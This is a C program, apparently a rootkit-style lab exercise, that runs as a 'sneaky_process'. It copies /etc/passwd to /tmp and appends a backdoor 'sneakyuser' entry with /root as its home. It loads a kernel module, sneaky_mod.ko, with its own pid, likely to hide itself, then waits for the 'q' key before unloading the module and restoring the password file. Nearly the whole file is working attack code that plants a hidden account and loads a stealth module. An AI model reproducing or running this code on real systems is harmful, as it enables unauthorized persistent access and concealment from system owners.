#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/wait.h>

#define TRUE 1

void run() {
    //1 print pid
    printf("sneaky_process pid = %d\n", getpid());

    //2 copy the file
    system("cp /etc/passwd /tmp");
    //2 open and insert new password
    system("echo 'sneakyuser:abc123:2000:2000:sneakyuser:/root:bash' >> /etc/passwd");

    //3 load sneaky module
    char array[200];
    int pid = (int) getpid();
    sprintf(array, "insmod sneaky_mod.ko pid=%d", pid);
    system(array);

    //4 in loop, reading char
    while(TRUE) {
        char x = getchar();
        if(x == 'q') {
            break;
        }
    }

    //5 unload module
    system("rmmod sneaky_mod");

    //6 restore file
    system("cp /tmp/passwd /etc");
    system("rm /tmp/passwd");
}

int main() {
    run();
}
